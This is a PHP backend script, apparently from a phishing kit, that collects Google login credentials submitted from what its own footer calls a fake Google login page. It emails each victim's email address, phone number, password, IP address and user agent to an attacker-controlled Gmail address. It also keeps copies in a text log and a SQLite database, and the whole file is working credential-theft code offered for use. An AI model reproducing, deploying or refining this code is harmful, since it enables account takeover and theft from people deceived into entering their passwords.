php
<?php
// submit.php - Handle data dan kirim ke email admin
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST');

// ========== KONFIGURASI ADMIN EMAIL ==========
// Baca email dari file konfigurasi (biar bisa diganti-ganti)
$config_file = 'admin_email.conf';
if (file_exists($config_file)) {
    $ADMIN_EMAIL = trim(file_get_contents($config_file));
} else {
    $ADMIN_EMAIL = "upiljaranmmbu@gmail.com"; // default
}
// =============================================


// Baca data dari request
$input = json_decode(file_get_contents('php://input'), true);

if (!$input || !isset($input['email']) || !isset($input['password'])) {
    echo json_encode(['success' => false, 'message' => 'Invalid data']);
    exit();
}

$email = $input['email'];
$phone = $input['phone'] ?? 'Not provided';
$password = $input['password'];
$ip = $input['ip'] ?? 'Unknown';
$user_agent = $input['user_agent'] ?? 'Unknown';
$timestamp = $input['timestamp'] ?? date('Y-m-d H:i:s');

// Format pesan email
$subject = "🔴 NEW GOOGLE LOGIN DATA - ZEROZX";

$message = "
<!DOCTYPE html>
<html>
<head>
    <style>
        body {
            font-family: 'Courier New', monospace;
            background: #0a0a0a;
            color: #00ff88;
            padding: 20px;
        }
        .container {
            max-width: 600px;
            margin: 0 auto;
            background: #111;
            border: 2px solid #00ff88;
            border-radius: 15px;
            padding: 20px;
        }
        h1 {
            color: #ff4444;
            text-align: center;
            border-bottom: 1px solid #333;
            padding-bottom: 10px;
        }
        .data-row {
            margin: 15px 0;
            padding: 10px;
            background: #1a1a1a;
            border-radius: 8px;
        }
        .label {
            font-weight: bold;
            color: #00ff88;
            display: inline-block;
            width: 120px;
        }
        .value {
            color: #fff;
            word-break: break-all;
        }
        .password-value {
            color: #ff8888;
            font-size: 18px;
            font-weight: bold;
        }
        .footer {
            text-align: center;
            margin-top: 20px;
            font-size: 11px;
            color: #555;
        }
    </style>
</head>
<body>
    <div class='container'>
        <h1>⚠️ GOOGLE LOGIN DATA CAPTURED ⚠️</h1>
        
        <div class='data-row'>
            <span class='label'>📧 Email:</span>
            <span class='value'>{$email}</span>
        </div>
        
        <div class='data-row'>
            <span class='label'>📱 Phone:</span>
            <span class='value'>{$phone}</span>
        </div>
        
        <div class='data-row'>
            <span class='label'>🔑 Password:</span>
            <span class='value password-value'>{$password}</span>
        </div>
        
        <div class='data-row'>
            <span class='label'>🌐 IP Address:</span>
            <span class='value'>{$ip}</span>
        </div>
        
        <div class='data-row'>
            <span class='label'>🖥️ User Agent:</span>
            <span class='value' style='font-size: 11px;'>{$user_agent}</span>
        </div>
        
        <div class='data-row'>
            <span class='label'>🕒 Timestamp:</span>
            <span class='value'>{$timestamp}</span>
        </div>
        
        <div class='footer'>
            🔒 This data was captured from fake Google login page<br>
            Zerozx System - Unlimited Power
        </div>
    </div>
</body>
</html>
";

// Kirim email
$headers = "MIME-Version: 1.0\r\n";
$headers .= "Content-Type: text/html; charset=UTF-8\r\n";
$headers .= "From: Zerozx System <noreply@zerozx.com>\r\n";
$headers .= "Reply-To: {$ADMIN_EMAIL}\r\n";

$mailSent = mail($ADMIN_EMAIL, $subject, $message, $headers);

// Simpan juga ke file log (backup)
$logData = "[" . date('Y-m-d H:i:s') . "] Email: $email | Phone: $phone | Pass: $password | IP: $ip | UA: $user_agent\n";
file_put_contents('captured_log.txt', $logData, FILE_APPEND);

if ($mailSent) {
    echo json_encode(['success' => true, 'message' => 'Data sent']);
} else {
    echo json_encode(['success' => false, 'message' => 'Email failed, but data saved to log']);
}

// Opsional: Simpan ke database SQLite
try {
    $db = new PDO('sqlite:captured_data.db');
    $db->exec("CREATE TABLE IF NOT EXISTS logins (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        email TEXT,
        phone TEXT,
        password TEXT,
        ip TEXT,
        user_agent TEXT,
        timestamp DATETIME
    )");
    
    $stmt = $db->prepare("INSERT INTO logins (email, phone, password, ip, user_agent, timestamp) VALUES (?, ?, ?, ?, ?, ?)");
    $stmt->execute([$email, $phone, $password, $ip, $user_agent, $timestamp]);
} catch(Exception $e) {
    // Silent fail
}
?>
